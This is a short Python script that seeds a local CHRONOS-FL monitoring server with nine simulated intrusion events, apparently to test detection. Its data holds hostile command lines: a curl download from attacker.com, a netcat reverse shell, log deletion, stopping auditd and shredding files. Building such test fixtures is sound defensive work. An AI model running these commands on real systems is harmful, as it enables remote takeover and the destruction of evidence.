"""
Seed live events into running CHRONOS-FL server at http://127.0.0.1:8050
"""

import urllib.request
import json
import time

API_URL = "http://127.0.0.1:8050/api/events/ingest"

events = [
    {"event_type": "execve", "pid": 1001, "ppid": 1, "comm": "sshd", "cmdline": "sshd: root@pts/0", "user": "root"},
    {"event_type": "execve", "pid": 1002, "ppid": 1001, "comm": "bash", "cmdline": "/bin/bash", "user": "root"},
    {"event_type": "execve", "pid": 1003, "ppid": 1002, "comm": "curl", "cmdline": "curl -s http://attacker.com/rev.sh -o /tmp/rev.sh", "target_path": "/tmp/rev.sh", "user": "root"},
    {"event_type": "execve", "pid": 1004, "ppid": 1002, "comm": "bash", "cmdline": "bash /tmp/rev.sh", "target_path": "/tmp/rev.sh", "user": "root"},
    {"event_type": "connect", "pid": 1005, "ppid": 1004, "comm": "nc", "cmdline": "nc -e /bin/bash 10.0.0.5 4444", "target_ip": "10.0.0.5", "target_port": 4444, "user": "root"},
    {"event_type": "execve", "pid": 1006, "ppid": 1002, "comm": "rm", "cmdline": "rm -rf /var/log/*", "target_path": "/var/log/syslog", "user": "root"},
    {"event_type": "execve", "pid": 1007, "ppid": 1002, "comm": "bash", "cmdline": "history -c", "user": "root"},
    {"event_type": "execve", "pid": 1008, "ppid": 1002, "comm": "systemctl", "cmdline": "systemctl stop auditd", "user": "root"},
    {"event_type": "execve", "pid": 1009, "ppid": 1002, "comm": "shred", "cmdline": "shred -u /tmp/rev.sh", "target_path": "/tmp/rev.sh", "user": "root"},
]

def run_seeder():
    for evt in events:
        try:
            req = urllib.request.Request(API_URL, data=json.dumps(evt).encode('utf-8'), headers={'Content-Type': 'application/json'})
            with urllib.request.urlopen(req, timeout=2) as resp:
                print(f"[+] Ingested event {evt['comm']} ({evt['event_type']}) -> Status {resp.status}")
        except Exception as e:
            print(f"[-] Error ingesting event: {e}")
        time.sleep(0.2)

if __name__ == "__main__":
    run_seeder()
